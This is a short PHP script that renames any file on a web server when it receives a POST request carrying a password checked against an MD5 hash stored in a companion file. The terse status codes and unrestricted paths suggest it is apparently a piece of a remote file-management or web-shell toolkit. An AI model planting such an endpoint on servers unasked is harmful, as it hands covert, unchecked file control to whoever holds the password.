<?php /*24.08.16
rename.php?s=pass~url~in 
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
if(!isset($_POST['s'])){exit('[X]');}
$d=explode('*/',file_get_contents('./p.php'));
$d=explode('/*',$d[0]);$s=explode('~',$_POST['s']); 
if(md5($s[0])!=$d[1]){exit('[X] PASS');}$d = array();

if(!isset($s[1])){exit('[X] RINAME not url');}
if(!isset($s[2])){exit('[X] RINAME not url in');}
if(!file_exists($s[1])){exit('[X] RINAME url not exist ('.$s[1].')');}
if(file_exists($s[2])){exit('[X] RINAME url in exist ('.$s[2].')');}

if(rename($s[1],$s[2])){
	echo '[V]';
}else{
	echo '[X]';
}

echo ' rename';
for($i=1;$i<count($s);$i++){
	echo '~'.$s[$i];
}
?>